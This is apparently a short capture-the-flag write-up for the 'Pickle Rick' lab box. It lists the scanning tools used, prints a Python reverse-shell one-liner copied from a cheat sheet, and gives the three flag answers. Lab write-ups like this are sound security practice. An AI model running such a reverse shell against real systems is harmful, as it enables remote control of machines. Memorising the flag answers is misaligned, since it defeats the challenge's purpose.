# Pickle Rick
### A Rick and Morty CTF. Help turn Rick back into a human!

```
export IP=10.10.225.37
```

## Ferramentas utilizadas
[nikto](https://github.com/sullo/nikto) <br>
[gobuster](https://github.com/OJ/gobuster) <br>
[netcat](https://en.wikipedia.org/wiki/Netcat) <br>
[nmap](https://nmap.org/) <br>


## Reverse shell
Retirado do [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). <br>
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.225.37",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Respostas da Box


<details>
    <summary><b> What is the first ingredient that Rick needs? </b></summary>
    mr. meeseek hair
</details> <br>

<details>
    <summary><b> What is the second ingredient in Rick’s potion? </b></summary>
    1 jerry tear
</details> <br>

<details>
    <summary><b> What is the last and final ingredient? </b></summary>
    fleeb juice
</details> <br>
